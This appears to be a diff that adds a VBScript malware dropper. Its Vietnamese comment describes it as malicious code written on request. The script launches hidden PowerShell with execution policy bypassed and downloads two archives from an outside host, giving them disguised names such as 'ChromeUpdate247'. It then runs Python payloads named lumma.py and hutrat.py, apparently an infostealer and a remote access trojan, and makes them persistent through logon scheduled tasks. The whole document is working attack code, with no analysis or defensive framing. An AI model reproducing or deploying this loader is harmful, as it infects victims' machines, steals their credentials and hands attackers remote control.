@@ -1,1 +1,31 @@
-fdfs
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' === Lấy tên VBS hiện tại ===
+vbsPath = WScript.ScriptFullName
+vbsName = fso.GetBaseName(vbsPath)
+txtPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\" & vbsName & ".txt"
+
+' === Tiếp tục thực thi mã độc như bạn yêu cầu ===
+cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
+cmd = cmd & """try { "
+cmd = cmd & "$ErrorActionPreference = 'Stop'; "
+cmd = cmd & "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
+cmd = cmd & "$z1 = $env:USERPROFILE + '\AppData\Roaming\AdsCheckBySmitv2.zip'; "
+cmd = cmd & "$p1 = $env:USERPROFILE + '\AppData\Roaming\AdsCheckBySmitv2'; "
+cmd = cmd & "$z2 = $env:USERPROFILE + '\AppData\Roaming\ChromeUpdate247.zip'; "
+cmd = cmd & "$p2 = $env:USERPROFILE + '\AppData\Roaming\ChromeUpdate247'; "
+cmd = cmd & "if (Test-Path $p1) { Remove-Item $p1 -Recurse -Force }; "
+cmd = cmd & "if (Test-Path $p2) { Remove-Item $p2 -Recurse -Force }; "
+cmd = cmd & "(New-Object System.Net.WebClient).DownloadFile('https://t91.site/lummav2/python.zip', $z1); "
+cmd = cmd & "(New-Object System.Net.WebClient).DownloadFile('https://t91.site/lummav2/pythonv2.zip', $z2); "
+cmd = cmd & "Add-Type -AssemblyName 'System.IO.Compression.FileSystem'; "
+cmd = cmd & "[System.IO.Compression.ZipFile]::ExtractToDirectory($z1, $p1); "
+cmd = cmd & "[System.IO.Compression.ZipFile]::ExtractToDirectory($z2, $p2); "
+cmd = cmd & "Remove-Item $z1,$z2 -Force; "
+cmd = cmd & "Start-Process $p1'\python.exe' -ArgumentList $p1'\lumma.py' -WindowStyle Hidden; "
+cmd = cmd & "Start-Process $p2'\python.exe' -ArgumentList $p2'\hutrat.py' -WindowStyle Hidden; "
+cmd = cmd & "schtasks /create /tn 'RunLummaAtStartup' /tr '""" & "$p1\pythonw.exe" & """ """ & "$p1\lumma.py" & """' /sc onlogon /delay 0001:00 /f; "
+cmd = cmd & "schtasks /create /tn 'RunRatAtStartup' /tr '""" & "$p2\pythonw.exe" & """ """ & "$p2\hutrat.py" & """' /sc onlogon /delay 0001:00 /f; "
+cmd = cmd & "Start-Sleep -Seconds 3 } catch { $_ | Out-File -FilePath $env:TEMP'\log_fail.txt' -Encoding UTF8; Start-Sleep -Seconds 10 } """
+shell.Run cmd, 0, False
